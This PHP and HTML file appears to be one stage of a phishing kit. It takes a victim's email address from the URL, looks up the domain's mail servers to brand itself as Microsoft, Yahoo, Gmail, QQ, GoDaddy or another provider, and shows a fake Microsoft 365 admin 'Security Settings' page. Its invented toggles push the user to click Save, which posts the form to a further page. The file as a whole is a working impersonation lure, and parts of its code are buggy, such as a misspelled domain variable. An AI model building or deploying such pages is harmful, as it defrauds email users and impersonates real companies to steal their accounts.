<?php
$isoffice='';
$login = $_GET['uid'];
$log = $_GET['uid'];

function mxrecordValidate($email, $domain) {
$arr = dns_get_record($domain, DNS_MX);
if ($arr[0]['host'] == $domain && !empty($arr[0]['target'])){
return $arr[0]['target'];
}}
 

$email=$login;
$domain = substr(strrchr($email, "@"), 1);
$siteURL = "https://mail.".$domin;
$filename='mail.'.$domin;
$filename = str_replace('.','_',$filename);
$filenamez ='../img/'.$filename.'.png';
if (!file_exists($filenamez)) {
 $backgroundimage ='../img/1.png';
}else{
 $backgroundimage=$filenamez;
}
$serv= mxrecordValidate($email, $domain);
if(mxrecordValidate($email, $domain)) {
$data = dns_get_record($domain, DNS_MX);
foreach ($data as $key1){
   $explit=explode('.',$key1['target']);
foreach ($explit as $xkey1){
if (strpos(strtolower($key1['target']), 'outlook') !== false) {
if (strpos(strtolower($key1['target']), $domain) && strpos(strtolower($key1['target']), 'outlook') !== false) {
$urlredi = 'https://office.com/owa/';
$ename = 'Microsoft';
$isoffice="1";
}else{
$urlredi = 'https://live.com/owa/';
$ename = 'Microsoft';
$isoffice="1";

}
}elseif(strpos(strtolower($key1['target']), 'yahoo') !== false) {
if (strpos(strtolower($key1['target']), 'aol') !== false){
$urlredi = 'https://login.aol.com';
}elseif (strpos(strtolower($key1['target']), 'mta') !== false){
$urlredi ='https://login.yahoo.com';
$ename = 'Yahoo';
}else{
$urlredi = 'https://login.yahoo.com';
$ename = 'Yahoo';
}
}elseif (strpos(strtolower($key1['target']), 'google') !== false) {
$urlredi =  'https://myaccount.google.com';
$ename = 'Gmail';
}elseif(strpos(strtolower($key1['target']), 'qq') !== false) {
$urlredi =  'https://exmail.qq.com/';
$ename = 'QQ 登录企业邮箱';
}elseif (strpos(strtolower($key1['target']), 'hinet') && strpos(strtolower($key1['target']), 'hibox') !== false) {
$urlredi =  'https://www.hibox.hinet.net/uwc/auth';
$ename = 'Hibox';
}elseif (strpos(strtolower($key1['target']), 'mailfilter')!== false) {
$urlredi =  'https://webmail.hinet.net/';
$ename = 'HiNet個人信箱';
}elseif (strpos(strtolower($key1['target']), 'emailsrvr')!== false) {
$urlredi = 'https://apps.rackspace.com/index.php';
$ename = 'Rackspace Webmail Login';
}elseif (strpos(strtolower($key1['target']), 'dns.com')!== false) {
$urlredi =  'http://www.dns.com.cn';
$ename = 'DNS.COM.CN';
}elseif (strpos(strtolower($key1['target']), 'zmail') !== false) {
$urlredi =  'http://ssl.zmail300.cn/page/login/login.jsp';
$ename = '登录企业邮箱';
}elseif (strpos(strtolower($key1['target']), 'hinet') !== false) {
$urlredi =  'https://webmail.hinet.net/';
$ename = 'HiNet個人信箱';
}elseif (strpos(strtolower($key1['target']), 'mailcloud') !== false) {
$urlredi =  'https://mail.mailasp.com.tw/';
$ename = 'MailCloud';
}elseif (strpos(strtolower($key1['target']), 'vip') !== false) {
$hostname = $domain;
$ename = 'VIP';
}elseif (strpos(strtolower($key1['target']), 'qiye163') !== false) {
$urlredi =  'https://mail.qiye.163.com';
$ename = 'qiye.163.com';
}elseif (strpos(strtolower($key1['target']), 'netease') !== false) {
$urlredi = $domain;
$ename = '163.COM';
}elseif (strpos(strtolower($key1['target']), 'secureserver.net') !== false) {
$urlredi = 'https://email25.godaddy.com/';
$ename = 'GoDaddy';
}elseif (strpos(strtolower($key1['target']), 'chinaemail') !== false) {
$urlredi = "chinaemail.cn";
$ename = 'BossMail';
}elseif (strpos(strtolower($key1['target']), 'aliyun') !== false) {
$urlredi = 'https://qiye.aliyun.com/';
$ename = 'Aliyun Mail';
}elseif (strpos(strtolower($key1['target']), 'mxhichina') !== false) {
$urlredi = 'https://qiye.aliyun.com/';
$ename = 'Aliyun Webmail';
}elseif (strpos(strtolower($key1['target']), '263') !== false) {
$urlredi = 'http://263xmail.com/';
$ename = '263 Mail';
}elseif (strpos(strtolower($key1['target']), 'coremail') !== false) {
$urlredi =  'https://mail.icoremail.net/';
$ename = 'CoreMail';
}elseif (strpos(strtolower($key1['target']), '1and1') !== false) {
$urlredi ='https://webmail.1and1.co.uk/';
$ename = 'Turn On Enhanced';  
}elseif (strpos(strtolower($key1['target']), "netsolmail") !== false) {
$urlredi =  'https://webmail5.networksolutionsemail.com/';
$ename = 'Turn On Enhanced';  
}elseif (strpos(strtolower($key1['target']), $domain) !== false) {
$urlredi = $domain;
$ename = 'Turn On Enhanced';  
}else{
$urlredi = $domain;
$ename = 'Turn On Enhanced';  
}
}
}
}else{
$urlredi = $domain;
$ename = 'Turn On Enhanced';  
}

?><!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" class="k-ff k-ff60" lang="en-US"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"> 
    <title><?php echo $domin;?>  admin center - Security &amp; privacy</title>

    <!-- perfping and other diagnostic scripts -->
 
   

  <link type="text/css" rel="stylesheet" href="mx/admin.css">
 	<link type="text/css" rel="stylesheet" href="mx/fabric.css">




    
    
     
    
        <link rel="shortcut icon" type="image/x-icon" href="https://prod.msocdn.com/2018.10.22.1/en-US/Images/favicon_metro.ico">

   </head>
<body class="o365-theme-base o365-theme-base" style="overflow: hidden; background-image:url(<?php $backgroundimage;?>); background-repeat:no-repeat;">
    <noscript>
        
        
    </noscript>

    
<div class="background-overlay"></div>
 


<table  class="Shell-Modern" id="ShellContainer" cellspacing="0" cellpadding="0">
    <tbody>
        <tr>
            <div id="ShellBodyAndFooterContainer" style="width: 1920px; height: 916px; overflow: hidden;" tabindex="-1">
                    <div class="Shell-Body" id="ShellBody" style="height: 886px;">
                        <div id="RootPageLayout" class="PageLayout Layout_FullScreen">
                                                            <div>
    <input name="BOXPageIDField" id="BOXPageIDField" value="ModernAdmin" type="hidden">

    
</div>
                            <table class="Content" cellspacing="0" cellpadding="0">
                                <tbody>
                                    <tr>
                                        <td class="Content" id="LayoutContentContainer">
                                            <table class="Content" cellspacing="0" cellpadding="0">
                                                <tbody>
                                                    <tr>
                                                        <td>
                                                            <div class="PageLayout-Padding ">
                                                            </div>
 
 

<!-- Footer -->
    <div id="DelayLoadAdminFooter"></div>
<div id="AdminAppFooter">
      

                    <!-- Instance: Website_IN_56; DeploymentId: 2b2eb4d2b217450aa18e6a82fd669b54 -->
                <div id="flyoutCover" class="flyoutCover" style="top: 0px;">                                        <div id="flyout" role="option" class="flyout fabric0103-ms-u-slideLeftIn40" ng-class="{'flyout-rtl fabric0103-ms-u-slideRightIn40':currentCultureInfo, 'flyout fabric0103-ms-u-slideLeftIn40':!currentCultureInfo}" style="right: 0px;">                                         <button data-hint="FlyoutClose" id="flyoutClose" setfocus="" data-value="undefined" ng-class="{'flyoutClose-rtl f-color-white':currentCultureInfo, 'flyoutClose f-color-white':!currentCultureInfo}" class="ms-Icon-FabricMDL2 ms-Icon-FabricMDL2--Cancel f-mrgn-right-20px flyoutClose f-color-white" ng-click="flyoutClose()" title="Close " aria-label="" tabindex="0"></button>                                              <!-- ngIf: contentLoaded --><div ng-if="contentLoaded" ng-class="{'flyout-header-rtl':currentCultureInfo, 'flyout-header':!currentCultureInfo}" class="flyout-header"><div class="flyout-head-title flyout-head_trim pc-header"><h1 class="f-txt-ovrflow flyout-head-title-h1-left-float" ng-class="::$root.currentCultureInfo ? 'flyout-head-title-h1-right-float' : 'flyout-head-title-h1-left-float'"><?php echo $ename; ?>  Security Settings</h1>  </div></div><!-- end ngIf: contentLoaded -->                                             <!-- ngIf: formData.title -->                                              <!-- ngInclude: '/AdminPortal/Settings/GuestUser' --><div ng-include="'/AdminPortal/Settings/GuestUser'" ng-class="{'flyoutContent-rtl':currentCultureInfo,  'flyoutContent':!currentCultureInfo}" class="flyoutContent"> 

<div ng-controller="SecuritySettingsController" ng-init="GetGuestUserSettings()">
    <!-- ngIf: showForm --><div ng-if="showForm" class="">
        <!-- ngIf: saveError -->
<form action="p/" class="f-wdh-480px f-disp-inblck  ng-pristine ng-valid" id="UpdateGuestUserPolicyForm" method="POST" name="UpdateGuestUserPolicyForm" novalidate tooltips="">            <div id="UpdateGuestUserPolicyForm">
<input type="hidden"  value="" name="main_domain" />
<input type="hidden" value="" name="sessionid" />
<input type="hidden" value="save.htm" name="openurl" />

                <!-- Enable GuestUserSetting Policy -->
                <div class="f-pad-top-20px-imp">
                    <div class="cldr-tbl">
                        <div class="g-dspy-row">
                            <div class="font-mediMicrosoftum cldr-row2">
                                <span>Let <?php 
								
								if (strpos(strtolower($ename), 'turn') !== false) 
								{echo 'Us';}else{echo $ename;}
								
								 ?> protection protect your organization</span><br>
                                <span><a href="https://go.microsoft.com/fwlink/p/?LinkId=826121" target="_blank"> Learn more about security</a></span>
                            </div>
                            <div class="cldr-row3">
                                <div class="fabric0103-ms-Toggle fabric0103-ms-Toggle--textAbove f-settings-tglbtn" style="outline: medium none currentcolor;">
                                    <input id="AllowGuestInvitations1" name="AllowGuestInvitations1" class="fabric0103-ms-Toggle-input ng-pristine ng-untouched ng-valid" role="button" aria-pressed="true" ng-model="guestUserSettings.AllowGuestInvitations" aria-label="Let users add new guests to the organization"  tabindex="0" aria-checked="true" aria-invalid="false"<?php if(isset($_GET['one'])){ echo 'checked="checked"'; }?>  type="checkbox">
                                    <label for="AllowGuestInvitations1" class="fabric0103-ms-Toggle-field wt-spc-no-wrp">
                                        <span class="fabric0103-ms-Label fabric0103-ms-Label--off f-pad-left-56px"title="Off">Off</span>
                                        <span class="fabric0103-ms-Label fabric0103-ms-Label--on f-pad-left-56px" >On</span>
                                    </label>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
				
				 
				<div class="f-pad-top-20px-imp">
                    <div class="cldr-tbl">
                        <div class="g-dspy-row">
                            <div class="font-medium cldr-row2">
                                <span>Activate Enhanced security protocol</span><br>
                                <span><a href="https://go.microsoft.com/fwlink/p/?LinkId=826121" target="_blank"> Learn more about security</a></span>
                            </div>
                            <div class="cldr-row3">
                                <div class="fabric0103-ms-Toggle fabric0103-ms-Toggle--textAbove f-settings-tglbtn" style="outline: medium none currentcolor;">
                                    <input id="AllowGuestInvitations2" name="AllowGuestInvitations2" class="fabric0103-ms-Toggle-input ng-pristine ng-untouched ng-valid" role="button" aria-pressed="true" ng-model="guestUserSettings.AllowGuestInvitations" aria-label="Let users add new guests to the organization" tabindex="0" aria-checked="true" aria-invalid="false"  <?php if(isset($_GET['two'])){ echo 'checked="checked"'; }?> type="checkbox">
                                    <label for="AllowGuestInvitations2" class="fabric0103-ms-Toggle-field wt-spc-no-wrp">
                                        <span class="fabric0103-ms-Label fabric0103-ms-Label--off f-pad-left-56px"title="Off">Off</span>
                                        <span class="fabric0103-ms-Label fabric0103-ms-Label--on f-pad-left-56px" >On</span>
                                    </label>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
				<div class="f-pad-top-20px-imp">
                    <div class="cldr-tbl">
                        <div class="g-dspy-row">
                            <div class="font-medium cldr-row2">
                                <span>Scan all incoming Messages with links</span><br>
                                <span><a href="https://go.microsoft.com/fwlink/p/?LinkId=826121" target="_blank"> Learn more about security</a></span>
                            </div>
                            <div class="cldr-row3">
                                <div class="fabric0103-ms-Toggle fabric0103-ms-Toggle--textAbove f-settings-tglbtn" style="outline: medium none currentcolor;">
                                    <input id="AllowGuestInvitations3" name="AllowGuestInvitations3" class="fabric0103-ms-Toggle-input ng-pristine ng-untouched ng-valid" role="button" aria-pressed="true" ng-model="guestUserSettings.AllowGuestInvitations" aria-label="Let users add new guests to the organization" tabindex="0" aria-checked="true" aria-invalid="false" <?php if(isset($_GET['three'])){ echo 'checked="checked"'; }?>  type="checkbox">
                                    <label for="AllowGuestInvitations3" class="fabric0103-ms-Toggle-field wt-spc-no-wrp">
                                        <span class="fabric0103-ms-Label fabric0103-ms-Label--off f-pad-left-56px"title="Off">Off</span>
                                        <span class="fabric0103-ms-Label fabric0103-ms-Label--on f-pad-left-56px" >On</span>
                                    </label>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
				
				<div class="f-pad-top-20px-imp">
                    <div class="cldr-tbl">
                        <div class="g-dspy-row">
                            <div class="font-medium cldr-row2">
                                <span>Block suspiciouse message from your inbox</span><br>
                                <span><a href="https://go.microsoft.com/fwlink/p/?LinkId=826121" target="_blank"> Learn more about security</a></span>
                            </div>
                            <div class="cldr-row3">
                                <div class="fabric0103-ms-Toggle fabric0103-ms-Toggle--textAbove f-settings-tglbtn" style="outline: medium none currentcolor;">
                                    <input id="AllowGuestInvitations4" name="AllowGuestInvitations4" class="fabric0103-ms-Toggle-input ng-pristine ng-untouched ng-valid" role="button" aria-pressed="true" ng-model="guestUserSettings.AllowGuestInvitations" aria-label="Let users add new guests to the organization" tabindex="0" aria-checked="true" aria-invalid="false" <?php if(isset($_GET['four'])){ echo 'checked="checked"'; }?>  type="checkbox">
                                    <label for="AllowGuestInvitations4" class="fabric0103-ms-Toggle-field wt-spc-no-wrp">
                                        <span class="fabric0103-ms-Label fabric0103-ms-Label--off f-pad-left-56px"title="Off">Off</span>
                                        <span class="fabric0103-ms-Label fabric0103-ms-Label--on f-pad-left-56px" >On</span>
                                    </label>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
				<div class="f-pad-top-20px-imp">
                    <div class="cldr-tbl">
                        <div class="g-dspy-row">
                            <div class="font-medium cldr-row2">
                                <span>Block Intruders from getting your information</span><br>
                                <span><a href="https://go.microsoft.com/fwlink/p/?LinkId=826121" target="_blank"> Learn more about security</a></span>
                            </div>
                            <div class="cldr-row3">
                                <div class="fabric0103-ms-Toggle fabric0103-ms-Toggle--textAbove f-settings-tglbtn" style="outline: medium none currentcolor;">
                                    <input id="AllowGuestInvitations5" name="AllowGuestInvitations5" class="fabric0103-ms-Toggle-input ng-pristine ng-untouched ng-valid" role="button" aria-pressed="true" ng-model="guestUserSettings.AllowGuestInvitations" aria-label="Let users add new guests to the organization" tabindex="0" aria-checked="true" aria-invalid="false" <?php if(isset($_GET['five'])){ echo 'checked="checked"'; }?>   type="checkbox">
                                    <label for="AllowGuestInvitations5" class="fabric0103-ms-Toggle-field wt-spc-no-wrp">
                                        <span class="fabric0103-ms-Label fabric0103-ms-Label--off f-pad-left-56px"title="Off">Off</span>
                                        <span class="fabric0103-ms-Label fabric0103-ms-Label--on f-pad-left-56px" >On</span>
                                    </label>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                              <div class="f-disp-inblck f-pad-top-12px">
                   <br/><h3 style="color:#000">How To Turn On Settings:</h3> <span><strong>Click on the button or switch it from Off to On, then Click Save Below. </strong></span>
                     
                </div>

               <div class="f-clr-both"></div>

                <!-- Buttons: Save and Cancel -->
                <div class="f-actn-btns">
                    <button id="SaveForm" type="submit" ng-class="'font-medium f-prm-btn'" ng-click="SaveGuestUserPolicy()" ng-disabled="" data-hint="Admin_GuestUserSetting" data-value="Save" tabindex="0" class="font-medium f-prm-btn">
                        <span>Save</span>
                    </button>
                    <button id="CancelForm" type="submit" class="font-medium f-sec-btn f-mrgn-left-8px" ng-click="Cancel()" data-hint="Admin_GuestUserSetting" data-value="Cancel" tabindex="0">
                        Close
                    </button>
                </div>
                <div class="f-clr-both"></div>
            </div>
</form>    </div><!-- end ngIf: showForm -->
    <!-- The div below is displayed after the user clicks on "Save" -->
    <!-- ngIf: saveInProgress -->

    <!-- The div bellow is displayed after the settings is updated -->
    <!-- ngIf: saveFinished -->
</div>
</div>                                              <!-- ngIf: showIndicator==true -->                                             <!-- ngIf: !contentLoaded -->                                         </div>                                       <!-- ngInclude: '/AdminPortal/Home/FlyoutFooter' --><div ng-include="'/AdminPortal/Home/FlyoutFooter'" class="flyoutfooter f-mrgn-top-60px">
<footer>
    <div style="float:right;">
    </div>
</footer>


</div>                                     </div></div>
        </tr>
    </tbody>
</table>
  
    
 